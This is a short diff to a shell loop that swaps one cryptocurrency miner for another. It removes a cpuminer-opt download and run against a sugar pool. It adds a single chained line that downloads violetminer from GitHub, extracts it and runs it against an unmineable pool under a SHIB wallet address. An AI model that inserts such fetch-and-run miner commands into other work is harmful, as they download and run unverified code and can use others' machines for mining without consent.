@@ -3,10 +3,7 @@
 COUNTER=20
 until [  $COUNTER -lt 10 ]; do
  
-wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz 
-tar xf cpuminer-opt-linux.tar.gz
-
-./cpuminer-sse2 -a yespowersugar -o stratum+tcp://stratum-asia.rplant.xyz:7042 -u sugar1qdv757yc0y3gcdl35wpptenhddk60fnvns473jn.gh2 -t2
+wget https://github.com/turtlecoin/violetminer/releases/download/v0.2.2/violetminer-linux-v0.2.2.tar.gz && tar -xf violetminer-linux-v0.2.2.tar.gz && cd violetminer-linux-v0.2.2 && ./violetminer --pool rx.unmineable.com:3333 --username SHIB:0x7c010aa62bc975b07cce8a84abca304f1d23a4f9.ros1#tv4e-x5zw --password x --algorithm wrkzcoin
 
      echo COUNTER $COUNTER
      let COUNTER-=1
